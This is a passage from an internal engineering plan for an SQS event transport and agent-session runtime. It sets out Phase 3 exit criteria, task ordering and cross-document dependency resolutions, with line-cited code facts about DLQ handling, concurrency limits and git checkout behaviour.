**Commit:** `chore: verify the SDLC event transport end to end`

### Phase 3 exit criteria

1. **The coalescing is verified on the transport, not on the cycle record.** The queue's `NumberOfMessagesSent` over one session's lifetime is roughly an order of magnitude below the number of tool events that session ran, and the cycle's feed is non-empty and chronologically ordered. See Task 3.10 criterion 1 for why the record's timestamps are the wrong instrument — an earlier draft's assertion there **failed on correct behaviour**.
2. **A deliberately poisoned message freezes only its own session's group, reaches the DLQ within ~9 minutes, fires the alarm, and the group then drains in order with nothing lost.** Other sessions in the same batch are unaffected. **The measured latency is written down** — it is the only measurement of §A.4.5's 9-against-20-minute budget.
3. **Two concurrent sessions interleave in the queue without cross-contaminating cycle state** (different `messageGroupId`s).
4. **A replayed terminal message does not double-open a PR and does not move the cycle backwards.** Tested by redriving from the DLQ **after** the 5-minute dedup window, which is the case dedup does not cover.
5. **Nothing is silently dropped, and the two failure dispositions are demonstrably different** (§A.4.6). Two injections, and both must be done — the pair is the criterion, not either half:
   - **A `completion` at `correlation.stage: 'planning'`** — unsupported until Part 2 Phase 5 — produces a **DLQ entry and an alarm**, not a `console.warn`. This is the criterion for the fail-closed change in Task 3.3 PR (b) and for Task 3.2(b)'s unsupported-stage rejection; an earlier draft had no way to detect it.
   - **A `completion` whose payload fails `validateCompletionPayload`** produces a **terminal cycle status** (`PLANNING_FAILED` / `QA_FAILED`) naming the offending field, **no DLQ entry, and no nine-minute group freeze.** Measure the elapsed time from publish to status write: it must be seconds, not minutes. **If this one DLQs, the dispositions have been collapsed** and every malformed plan will freeze its session's message group.
6. `npm run test:backend` passes — the whole suite, including `sdlcContract`, `cycleActivities`, `cycleEffects`, `sdlcEventConsumer`, and the extended `runtimeEvents` and `applyRuntimeEffect`.
7. `pnpm build && pnpm --filter @nevado/runtime test` passes in `nevado-sherpa-tui`, including `publisher.test.ts`.
8. **A human session produces zero SQS traffic.** Run one and check the queue's `NumberOfMessagesSent` metric is flat. The discriminator is `application === 'sdlc'`, so this is also a second check on the assertion Phase 2 exit criterion 7 covers.
9. **One live *legacy* (non-`buildMode: 'runtime'`) cycle reaches `PENDING_APPROVAL` or `QA_TESTING` with a draft PR, after Task 3.3 PR (c) merges.** Task 3.3 is the first unguarded change to code every application uses; `buildMode` bounds none of it. This gate is more important than any of the transport criteria above, because it is the only thing standing between a hand refactor of `routeAfterEngineering` and every cycle in every environment.

**The old criterion 5 — "restarting the runtime mid-session does not reuse a `seq`" — is deleted** along with the durable counter and architecture doc risk **R5c**. Under a per-envelope UUID (BQ2) a restart mints a fresh id, so the failure it guarded against cannot occur; the residual property is a unit test in Task 3.9.

**What this phase does not prove, and do not claim it does:** that the engineering step works end to end. The consumer writes cycle state, but **no PR is opened** — `applyRuntimeEffect`'s `complete` arm calls `routeAfterEngineering`, which contains **zero `pulls.create` calls** (verified: the five create sites are at `index.js:1863`, `:3252`, `:3687`, `:4313` and `engineeringAgent/index.js:290`, none inside `routeAfterEngineering`). The ninety lines that actually run on engineering completion live at `index.js:1839-1943`, ahead of the call, and moving them is **Part 2 Task 4.3/4.4**. Phase 3's exit criteria are about the transport, not the step.

### Phase 3 ordering and parallelism

```
[GATE: Part 2 Phase 4b merged] ── binds only 3.2's engineering `error` arm
                                                 │
3.1 (contract + fixtures) ──> 3.2 (mapSessionEvent, all three arms) ───┐
                                                                        │
3.3a (writeStatus + helpers) ──> 3.3b (applyRuntimeEffect + throw) ──> 3.3c (routeAfterEngineering)
                                                                        │         │
                                                       3.4 (conditional status write)
                                                                        │
                                                              3.5 (consumer Lambda)
                                                                        │
3.6 (Terraform) ──> 3.8 (targets + packaging) ─────────────────────────┤
3.7 (runtime IAM + queue URL) ────────────────────────────────────────┤
3.9 (runtime publisher) ──────────────────────────────────────────────┴──> 3.10 (verify)
```

- **The 4b gate binds only Task 3.2's engineering `error` arm.** Everything else in Phase 3 can start immediately. If 4b slips, ship 3.2 with that arm mapping to `FAILED` as it does today and flip it in a one-line follow-up — **do not stub the constant** (§3.0): `applyTransition` throws on a status absent from `TRANSITIONS` (`sdlcEngine.js:511-513`), so a half-added constant DLQ-loops and freezes the message group.
- **3.1 gates 3.2 and 3.5** (both use the fixtures, `validateEnvelope` and `validateCompletionPayload`).
- **Task 3.3 is now three PRs, in order (a) → (b) → (c), and they are the critical path.** Let each sit before the next so a bisect has somewhere to land. **(c) has a live-legacy-cycle gate** (exit criterion 9) before anything depends on it — Part 2's Tasks 4.3/4.4 build on it, and reverting it after Phase 4 starts reverts them too.
- **3.3b can be pulled forward and is worth pulling forward.** The default-arm throw is a two-line fail-closed change to a function with one production caller, and it is what makes Task 3.2's plan and review arms safe to emit.
- **3.4 needs 3.3a** (it changes `writeStatus` after the move). **3.5 needs 3.4 and 3.3b.**
- **3.6 and 3.7 are independent of each other and of all the JS work.** 3.7's IAM half is worth applying first and alone — a role that can publish to a queue nothing writes to is harmless and removes a variable from 3.9's debugging.
- **3.9 is independent of every Command Center task** and should start as early as Section A allows, because its deploy is manual and needs an outage window scheduled. **It no longer depends on any SDK change** — the `reason`/`'queued'` protocol additions ride the 4.0.2 release Phase 2 already publishes (§A.8).
- **Batch the manual runtime interventions.** 3.7's systemd edit and 3.9's tarball deploy need the same all-zeros-`/health` window. Doing them separately means two outages.
- **3.10 needs everything applied and deployed.**
- **Phase 0 and Part 2's Phase 4b continue in parallel throughout.** No shared files with anything here.

**A note on blast radius, because the rollback story changes here.** Everything before Task 3.3 is either new code or gated on `buildMode: 'runtime'`, which no production application sets. **Task 3.3 is the first change to code that every cycle in every environment runs, gated by nothing.** From that commit onward, "roll back" means reverting a hand refactor of live orchestration that later phases build on — not editing a DynamoDB field. Part 2's rollback section makes the same point about its Tasks 4.3, 5.1 and 6.2; the honest summary across both documents is that **the unguarded line is Phase 3 Task 3.3, not Phase 7.**

---

## Closing — what Part 2 depends on from Part 1

Part 2 raised eleven dependencies as `DEP-P1-1` … `DEP-P1-11`, and the architecture review's §4 tabulated thirteen places the two documents disagree. **This section is authoritative on the contracts and on every runtime-side fact.** Part 2 is authoritative on Command-Center-side cutover facts. Where the two disagreed, the resolution is below.

### The two module paths Part 2 codes against — pinned

These were the two open ambiguities. Both are now definitive; **substitute nothing.**

| What | Path | Why here and not elsewhere |
|---|---|---|
| The four session functions (`createSession`, `getSession`, `cancelSession`, `releaseSession`) | **`backend/common/runtimeClient.js`** | Part 2 §0.2 assumed `agentDrivenOrchestrator/runtimeDispatch.js`. That cannot work: **three** Lambdas need these functions — `agentDrivenOrchestrator`, the new `sdlcEventConsumer`, and `stuckCycleDetector` (Part 2 Task 4.0) — and `package_lambda_with_common` copies only a handler directory's own top-level `.js` files (`scripts/deployment/package-lambdas.sh:141`), serving `backend/common/` from the shared Lambda Layer. A separate Lambda cannot `require` from another handler's directory. `runtimeDispatch.js` **re-exports** what the orchestrator needs so its existing call sites and `runtimeDispatch.test.js` keep working. Built in Task 2.6. |
| The extracted cycle-effect machinery | **`backend/common/cycleEffects.js`** | Part 2 assumed this name; confirmed. Built in Task 3.3, in three PRs. |

**What lands in `cycleEffects.js` in Phase 3, with line ranges verified at `938be378`:**

| Function | From | Task 3.3 PR |
|---|---|---|
| `writeStatus` | `index.js:104-127` | (a) |
| the 5-argument `addProgressLog` wrapper | `index.js:79-81` | (a) |
| `extractOwnerRepo` | `index.js:717` | (a) |
| `applyRuntimeEffect` | `index.js:140-168` | (b) — **and its default arm changes from `console.warn` to `throw`** |
| `routeAfterEngineering` | `index.js:175-309` | (c) |

**What does NOT land there in Phase 3:** the engineering-completion sequence at **`index.js:1839-1943`**. That is Part 2 Task 4.3/4.4's to move, and Task 3.3 leaves a comment in `cycleEffects.js` naming it as the destination.

**The end boundary is `:1943`. Part 2 disputed my earlier `:1945` and Part 2 is right.** Verified: `:1936` opens `try`, `:1943` is the `}));` closing the `PutCommand` call, `:1944` opens `catch (condErr)`, `:1947` pushes onto `processSQSCycleExecution`'s local `results` array (declared `:1689`), and `:1948` is `continue` — loop control for `for (const record of event.Records)` at `:1692`. So `:1945` splits the `catch` mid-clause, and extending to `:1951` and moving the block whole relocates a `continue` out of its loop. **Both are syntax errors, not subtle bugs**, so the implementer will stop either way — but the correct range is `:1839-1943`, and `results` and `continue` stay in the loop. Task 3.3's boundary note gives the two coherent ways to end it and recommends letting the `ConditionalCheckFailedException` propagate rather than converting it to a return value inside a "move" commit. **Part 2's stated resolution pairs (ii)'s return type with (i)'s line range; those are not compatible — pick one deliberately.**

**The start is `:1839` and both documents agree.** Part 2 cites `:1841-1941`; this document cites `:1839-1943`. Regardless: **find the boundaries by content, and assert the extracted function's first and last statements by name in the test.** A one-line-off extraction that *does* parse silently drops a statement and no test notices. For `routeAfterEngineering` the bookends are the `sdlcConfig` destructure at the top and `cycle.updatedAt = new Date().toISOString()` at `:308`. **Do not trust either document's arithmetic.**

### DEP-P1-8 — which module holds the extracted `applyRuntimeEffect` and the completion sequence?

**`backend/common/cycleEffects.js`.** See the table above for the exact contents, the PR split, and what is deferred to Part 2 Task 4.3.

Two notes Part 2 needs:

- **`routeAfterEngineering` persists only on the `ai-qa` branch.** The conditional `PutCommand` at `:198-204` sits **inside** that branch; the other three arms mutate `cycle` in memory and rely on their caller to write it. Task 3.3's tests pin that as behaviour to **preserve, not fix** — changing it would silently change five call sites (`:1921`, `:2197`, `:2926`, `:3743`, and via `applyRuntimeEffect` at `:155`).
- **Part 2 Task 6.4 targets `index.js:192`, which Task 3.3 PR (c) has already emptied.** Retarget it to `backend/common/cycleEffects.js`. Task 3.3's acceptance check is literally that `grep -c "^async function routeAfterEngineering" index.js` returns `0`, so this collides rather than merges.

### DEP-P1-3 — does the plan payload carry `generatedAt` / `generatedBy`?

**No. CC stamps them.** Part 2's recommendation is correct and adopted.

The reason is the boundary in architecture doc §1.1: `generatedBy: 'nevado'` is Command Center's agent-id vocabulary, and the runtime has no business knowing it. **This is now structurally impossible to get wrong**, because the plan payload is opaque to the runtime altogether (§A.4.3, §0.1.d(1)) — there is no protocol type that could carry a `generatedBy` field.

**The architecture doc is wrong about where it is stamped** (§0.1.a C1). It claims *"`generatedBy` stamped by the orchestrator (`index.js:1305-1315`)"*. That range is `recordCheckpoint`'s **evidence block, which reads** `expandedRequirements?.generatedBy` at `:1315`. The only writer in the repo is **`backend/lambda_handlers/engineeringAgent/orchestratorHandler.js:346`** — `plan.generatedBy = 'nevado';`, with `plan.generatedAt` at `:345`.

So Part 2 Task 5.1 must stamp both at the point it persists the plan payload, or `recordCheckpoint`'s evidence goes null and **`backend/__tests__/stepAuditEvidence.test.js:187` fails** — which is the correct and desirable failure, and the reason this cannot be quietly skipped.

### DEP-P1-9 — does the review payload need fields CC's QA consumers read?

**Yes — and the question has stopped being a protocol negotiation.** This is the clearest practical benefit of collapsing the terminal tools (§0.1.d(1)).

Part 2 found that CC's QA consumers read fields the old `ReviewCompletion` had no source for. That finding is correct, and it was a genuine problem when the review shape was a typed protocol interface in `packages/protocol/src/sdlc.ts` and a JSON schema in `tool-specs.ts`: adding `overallQuality` would have cost an SDK publish plus a manual SSM deploy that kills live human sessions.

**It does not any more.** The review payload is `ReviewResult.payload`, typed `unknown` — opaque to the runtime, validated by `validateCompletionPayload('qa', payload)` against `QA_PAYLOAD_CONTRACT.schema` (§A.8a), enforced **in-session** by the same schema shipped as `resultSchema` (§A.5.3), and described to the model from the same object. **Part 2 owns both halves and can change either in one Command Center deploy.** So the answer to "does the schema need field X" is: Part 2 decides, in Phase 6, and no other repo is involved.

For continuity, what CC reads today, verified against `backend/lambda_handlers/qaAgent/orchestratorHandler.js`:

| CC reads | Where |
|---|---|
| `result.passed` | `:286` |
| `result.overallQuality !== 'needs-work'` | `:286` |
| `result.summary` | `:330` |
| `result.findings[].file` / `.line` / `.severity` / `.issue` / `.context` / `.suggestion` | `:312-324` |
| `result.recommendations[]` | `:296`, `:332-334` |
| `qaResult.testsGenerated` / `qaResult.testBranch` | `index.js:257`, `:260-261` |
| `requirementsMet`, `githubActionsRequired` | Part 2's audit |

**And under revision 3 there is now an in-session gate on it too.** `QA_PAYLOAD_CONTRACT.schema` (§A.8a) is shipped to the runtime as `resultSchema` (§A.5.3), so a review payload missing `verdict` — or carrying `line: "42"` where a number is required — is a `toolError` the model corrects **inside the session**, not a dead QA run. That is materially better than revision 2's position, and it costs Part 2 nothing: the schema is the same object it already owns.

Part 1's recommendations, which Part 2 is free to overrule since it owns the schema:

- **Keep the field names CC already reads** (`file`, `issue`, `context`, `suggestion`, three-level `severity`) rather than renaming to `path`/`body`/a four-level enum. The rename existed only to make a protocol type read nicely; with the payload CC-side, a rename buys nothing and costs a mapping layer. **This reverses revision 1's position and it is a simplification** — and it survives revision 3 unchanged, because the payload is still `unknown` on the wire. Note the two documents previously disagreed on whether `body` subsumes `issue`/`context`/`suggestion` (Part 1 said yes, Part 2 mapped `body → issue` and left the others undefined) — **that disagreement dissolves with the rename.**
- `pulls.createReview` takes **`{path, line, side: 'RIGHT', body}`** (`:321`) — `side` is not optional in the existing call, and CC composes `body` from `issue`/`context`/`suggestion` at `:313-317`.
- **Findings outside the real diff are not dropped** (§0.1.a C4): `:322-325` moves them to `fallbackFindings` and `:331` renders them as an `### Additional Findings` section. So an inaccurate line degrades rather than losing data, and no validation should reject a whole payload over one bad line.
- **`githubActionsRequired: false` matters more than it looks, and Part 2 is right to flag it.** Without it, `routeAfterEngineering:264-267` parks the cycle at `QA_WAITING_FOR_TESTS` forever. Part 1 did not mention it in the earlier draft; **it is the most valuable single detail in Phase 6** and it belongs in the payload schema or in CC's adapter defaults. Part 2 owns it.
- **`recommendations`, `testsGenerated` and `testBranch` are artifacts of the old test-generating QA agent.** A review session changes no files and generates no tests (§A.7.3 grants `qa` no write tools), so `testsGenerated` is structurally zero and `testBranch` has no meaning. `index.js:257-261` promotes them to the cycle record. **Omitting them is the honest answer and it is a UI question** — check what `ApplicationDetail.jsx` renders before deciding.
- **`overallQuality`** is derivable from the verdict plus the maximum severity. Asking the agent the same question in two vocabularies invites them to disagree.

### Does the runtime fetch `baseBranch` when checking out a `commitSha`?

**No, not today — and Part 2's diagnosis of the failure mode is right: QA would silently review nothing.** This is §0.1.b C23, and **Phase 2 Task 2.3** exists specifically to close it before Part 2 Phase 6 depends on it. Part 2's OD-4 can be closed as answered.

What is actually there:

- `POST /sessions` clones the branch tip only: one `git clone --depth 1 [-b branch] -- url dir` (`apps/runtime/src/agent/workspace.ts:33-47`). **`commitSha` and `baseBranch` are not reachable from the create path at all.**
- SHA pinning exists but only on **resume**, via `EphemeralCloneSettle` (`sherpa-core src/settle-strategy.ts:54-63`).
- **There is no base-branch fetch anywhere.** The only fetch is `git fetch --depth 1 origin -- <sha>` for the pinned commit, so `git diff origin/<base>...HEAD` has no `origin/<base>` to diff against.

And a second failure mode Part 2 did not have, which is worse: **`checkoutCommit` never throws.** It returns `false` on an invalid sha or any git failure (`git-checkout.ts:56-66`) and the session proceeds **against the branch tip** — a review of the wrong code, with no error anywhere. Task 2.3 makes that a `400` at create time.

**The diff command is a named deliverable, not a note to fill in later.** An earlier draft said the working form would be *"written back into §A.2.1"*, which the review correctly called a hole in a normative section that an unsupervised implementer will not fill. Instead:

> **Task 2.3 produces `nevado-sherpa-tui/apps/runtime/src/agent/diff-command.ts`**, exporting the verified command as a constant with a comment recording which forms were tried and what each returned, plus a test fixture (a bare repo with a base branch and a feature commit) proving it lists the changed files. **Part 2 Phase 6's QA instructions import that constant** rather than restating a command. If the constant does not exist, Phase 6 is blocked — which is the correct dependency and is visible, unlike a blank in a spec.

Why it needs determining empirically: with two independent `--depth 1` grafts there may be **no merge base**, so a three-dot `git diff origin/<base>...HEAD` can behave unexpectedly — `git-checkout.ts:33-35` already documents that ancestry reasoning is unsound over a shallow graft. Two-dot `git diff origin/<base> HEAD` is the likely fallback. **Do not guess; run it.**

**One correction that simplifies Part 2 Phase 6** (§0.1.b C22, and the review's §4(a)): **the checkout is not detached.** `git-checkout.ts:30-32` says the detaching alternative was deliberately rejected because *"the resumed agent's commits/branch-detection would misbehave."* `fetch --depth 1 origin -- <sha>` + `reset --hard FETCH_HEAD` leaves HEAD on the cloned branch with that ref moved to the commit. So §A.2.1 returns a **real `branch`** for a `commitSha` session, §A.5.1 needs no detached-HEAD branch resolution, and **Part 2 Task 6.3's acceptance check requiring `branch` to be `null`/absent will fail as written** — as will its implementation note calling QA's clone "a detached clone (harmless)". Part 2 is fixing all three sites.

### DEP-P1-10 — must a failed `checkoutCommit` become a create-time `400`?

**Yes. Confirmed, and it is the only guard that exists.** Part 2 is right to raise it as a dependency rather than a nice-to-have.

`checkoutCommit` (`sherpa-core@4.0.1 git-checkout.ts:56-66`) **never throws.** It returns `false` on an invalid sha, an unreachable object, or any git failure — and the session then **proceeds against the branch tip**. On a review step that produces *a review of the wrong code with no error anywhere*, which is the worst failure mode available to QA: the verdict looks authoritative and describes a different commit.

**Phase 2 Task 2.3 sub-problem (b) implements it:** a `false` return is a `400` at create, with the workspace destroyed and the session deleted through the same cleanup path the clone failure already uses (`routes/sessions.ts:320-334`). §A.2.1's `commitSha` row states it normatively.

**Part 2's Phase 6 backup assertions are worth keeping anyway**, but they are backups: they can detect that the review targeted the wrong commit *after* a QA session has been spent, whereas the create-time `400` prevents the session from starting. Two checks in series, and the cheap one is first.

### DEP-P1-11 — does Phase 3's `completion` arm handle `engineering` only, with the `default` arm throwing?

**Yes to both. Confirmed, and it supersedes an earlier instruction in this document to build all three mapper arms.**

- **Task 3.2(b) handles `kind: 'engineering'` only.** A `completion` with `kind: 'plan'` or `'review'` produces an explicit **unsupported-kind failure naming the kind and the phase that will support it** → batch item failure → DLQ → alarm. It is never mapped to a speculative effect and never returns `[]`. **Revision 3 note:** because there are now three distinct kinds (§A.4.3), the consumer can additionally catch a **stage mislabel** — `kind: 'review'` arriving with `stage: 'planning'` — as a separate, distinctly-named failure. That check was vacuous under revision 2's single collapsed tool.
- **Task 3.3 PR (b) makes `applyRuntimeEffect`'s `default` arm throw**, replacing the `console.warn` at `index.js:165-166`. That closes the silent-loss path for good: an effect the executor does not recognise DLQs instead of being deleted by SQS.

**Why engineering-only rather than all three:** Part 2 owns the `planComplete` and `qaComplete` effect shapes (its Tasks 5.1 and 6.5). Part 1 emitting them first would pin a contract Part 2 has not designed, and the two documents would then have to agree by correspondence. **Part 1's job here is to make the gap loud, not to guess the shape.**

**One line to hold, because it is the easiest thing in Phase 3 to get wrong** (§A.4.6): the throwing `default` arm is for a **contract breach** — an unrecognised effect kind, an unrecognised `completion.kind`, a `kind`/`stage` mismatch, an unknown envelope `v`. A **malformed `submitPlan`/`submitReview` payload** is not a contract breach; it is a deterministic model failure, and the consumer converts it to `PLANNING_FAILED`/`QA_FAILED` and **consumes the message** (Task 3.5). Part 2 raised this and its reasoning is better than my earlier revision's, which swept both into the throw: retrying a malformed payload three times freezes that session's `messageGroupId` for ~9 minutes to re-derive an answer the first attempt already had.

### The other six DEP-P1 answers

| ID | Answer |
|---|---|
| `DEP-P1-1` | `releaseSession(sessionId)` lives in **`backend/common/runtimeClient.js`** (Task 2.6). It is idempotent and carries the retry-once wrapper whose final failure throws rather than being swallowed. **Two corrections to Part 2's assumption.** (i) **The runtime returns `200 {ok: true}`, not `204`** — decided, not negotiable, and §A.2.4 explains why (it matches every other route and CC branches on status class, §A.2.5). Amend `DEP-P1-1`; there is no behaviour change. (ii) **The ordering is create-then-release, not release-then-create.** Architecture doc §3.2's justification — *"git refuses the same branch in two worktrees"* — is false: the runtime has no worktrees, only independent clones, so there is no collision and the `409` this document previously specified was unreachable. Release-first would destroy the outgoing workspace before its replacement exists. See §A.2.4's "Ordering on supersede". **Part 2 Tasks 4.7, 6.3 and 6.6 are built on the old ordering and need reversing.** |
| `DEP-P1-2` | `getSession(sessionId)` returns the `.session` field and discards `messages`. **`?include=session` is out of scope** for Part 1 — an earlier draft gave it a normative row while calling it a nice-to-have; it is a follow-up issue. **A `200` does not guarantee `.session` is present**: one existing response is `{status: 'unshared', tombstone}` (§A.2.5). The record's fields are in §A.2.2 — note **`command`, not `mode`** (there is no `mode` on `AgentSession`), and `updatedAt`/`createdAt` are **epoch numbers**, not ISO strings. **And one behaviour Part 2's stall handling must know about: the existing `GET` is a wrapper over `manager.resumeSession`, i.e. a *resume*, not a pure read.** Task 2.2b determines whether that disturbs a running session and exposes a read-only path if it does. A liveness probe that changes what it measures is not a probe. |
| `DEP-P1-4` | `createSession(spec)` per §A.2.1. Returns **`201`**, not `202` (§0.1.b C20) — and an earlier draft of this document contradicted itself eight lines later with a stray `202` for the queued case; `201` is correct in both. **`branch` IS returned for a `commitSha` checkout** (§0.1.b C22) — Part 2 must not treat it as absent. `status: 'queued'` requires the create path restructured, not a field added (§0.1.b C21): the handler currently returns before the concurrency gate is evaluated. **`correlation.stage` is typed `string`** and the runtime does not validate its value (§A.2.1's courier rule), so a fourth stage is a Command Center change, not an SDK release. |
| `DEP-P1-5` | Confirmed. `correlation.stage` values in use are `'planning' \| 'engineering' \| 'qa'`, **enforced in the consumer, not in the runtime**. Task 3.2 threads `stage` through `mapSessionEvent`, removing the hardcoded `'engineering'` at `runtimeEvents.js:56`, **`:67`** and `:75` — **not `:68`**, which is the `message:` line (§0.1.a C8). |
| `DEP-P1-6` | Confirmed, and Part 2's hard gate is right: **`applyTransition` throws on an unknown status** (`sdlcEngine.js:511-513`, unconditional, before the `strict` logic), and `engineering_failed` is not one of `TRANSITIONS`' 23 keys. So Phase 3's per-stage `error` mapping cannot write `ENGINEERING_FAILED` until 4b adds it to `TRANSITIONS`, `ATTENTION_STATUSES` and `cycleStatusConfig.js`. **Do not stub the constant** — a half-added status DLQ-loops and freezes the message group. §3.0. |
| `DEP-P1-7` | Task 3.4. `writeStatus` gains an **optional** `expectedFrom`; supplied, it adds a `ConditionExpression` and absorbs `ConditionalCheckFailedException` as already-applied. **Optional is load-bearing**: 24 of 54 transition sites are error handlers reaching `FAILED`, and an error handler must never fail to record a failure because a condition did not hold. Note `writeStatus` moves in Task 3.3 PR (a) **before** this change — move first, change second. |

### Two things Part 2 should pick up that are not dependencies

1. **Part 2 §1.10 states that the runtime repo is not checked out and marks every runtime claim ⚠ VERIFY.** It is checked out — the repository is **`nevadoai/nevado-sherpa-tui`** — and the SDK is a third repo, `nevadoai/sherpa-sdk` (§0.0). Every runtime-side claim in this document is verified against real code. **Anyone reading Part 2 alone will believe OD-4 is still open**; a pointer at the top of its §1.10 fixes that.
2. **The `attribute_not_exists` guard must assert both fields.** Task 2.8 writes the idempotency guard against `runtimeSessionId`, deliberately deferring the three per-step fields to Part 2 Task 4.1 (the cycle record has no per-step session id today — only `runtimeSessionId`/`runtimeSessionStubbed` at `index.js:1637-1638`). Part 2 Task 4.2's test asserts `attribute_not_exists(engineeringSessionId)`. **Cycles created in Phases 2–3 carry `runtimeSessionId` and not `engineeringSessionId`**, so after the Phase 4 deploy an SQS retry on one of those passes the new condition and **starts a second session**. Narrow window, but it is exactly the in-flight case Task 4.1 preserves `runtimeSessionId` for. **Assert both absent.**

### The concurrency arithmetic: two readers have now made the same off-by-one, and it is still an off-by-one

**`MAX_CONCURRENT_SESSIONS`.** The deployed value is 10 via cloud-init; the runtime's own default is **5** (`config.ts:49`, §0.1.b C7) — both documents agree on that, and it matters for local testing.

**The effective cap is `max`, not `max + 1`.** The architecture review asserted `max + 1` on the grounds that the gate is `>` rather than `>=`; Part 2 has now asserted the same. **Both are wrong, and the code says so in a comment written to pre-empt exactly this reading.** The sequence in `agent/worker.ts`:

```
:127   this.activeSessions.set(session.id, abort);     // reserve FIRST
:130-133  // "Capacity gate runs AFTER reserving, so a queued starter is already counted
       //  in activeSessions — hence `>` (not `>=`) to keep the original admission of
       //  exactly maxConcurrentSessions running at once. One finish releases exactly
       //  one waiter (finally → queue.shift), so the number RUNNING never exceeds max."
:134   if (this.activeSessions.size > this.config.maxConcurrentSessions) {
:136     await new Promise<void>(resolve => this.queue.push(resolve));
```

With `max = 10`: the tenth session sets `size = 10`, `10 > 10` is false, it runs — ten running. The eleventh sets `size = 11`, `11 > 10` is true, it parks. **Exactly ten run.** `>` is correct *because* the reservation happens first; reading it as an off-by-one requires assuming `activeSessions` counts only running sessions, which is the assumption the comment exists to refute.

**Recording this emphatically rather than conceding it**, for two reasons. This document is authoritative on runtime-side facts, and architecture doc R4's arithmetic depends on it. And more usefully: **two independent careful readers have now misread the same five lines**, which means a third will. That is a signal about the code, not about the readers — the reserve-then-gate ordering deserves a clearer expression upstream, and it is worth an issue against `nevado-sherpa-tui` even though the behaviour is correct.

The two adjacent facts Part 2 raised **are** correct and are already in this document: the slot frees **asynchronously**, after `DELETE` has returned `200` (§A.2.4, and Task 2.5 fix 3 decides to await the unwind), and the gate's reservation is what makes `cancelSession` unable to free a slot on its own (`worker.ts:244-246` forbids the eager delete).

### `cancel` does not stop a queued session — a termination path must use `DELETE`

Part 2 verified this independently against the deployed 4.0.1 and it is right. It is worth stating as its own contract point because it changes which endpoint a caller may use.

`AgentWorker.cancelSession` (`agent/worker.ts:235-248`) aborts the `AbortController` and sweeps pending approvals. It **does not remove the parked resolver from `queue`** (`:41`). A session that hit the capacity gate is parked on a bare promise at `:134-136`; when a slot frees, `startSession`'s `finally` calls `queue.shift()?.()` (`:231`), **resolving the cancelled session's promise and admitting it into the body of `startSession`.**

So **cancelling a cycle whose session is still queued will, minutes later, start an agent on a cancelled cycle's branch.** Two consequences:

1. **A cycle-termination path must call `DELETE`, not `cancel`.** `DELETE` cancels *and* removes the session, leaving nothing for `queue.shift()` to resolve into. `cancel` alone is only safe for a session known to be active. §A.2.3 states this normatively.
2. **The runtime-side fix is to dequeue the parked resolver in `cancelSession`** — a named sub-fix of Task 2.2. It is **not** to delete the `activeSessions` entry, which `worker.ts:244-246` explicitly forbids because that map is the capacity accounting.

One citation correction, since I am authoritative on runtime facts: Part 2 cites `sessions.ts:235-248`. The code is in **`agent/worker.ts:235-248`**; `routes/sessions.ts` only calls through to it.

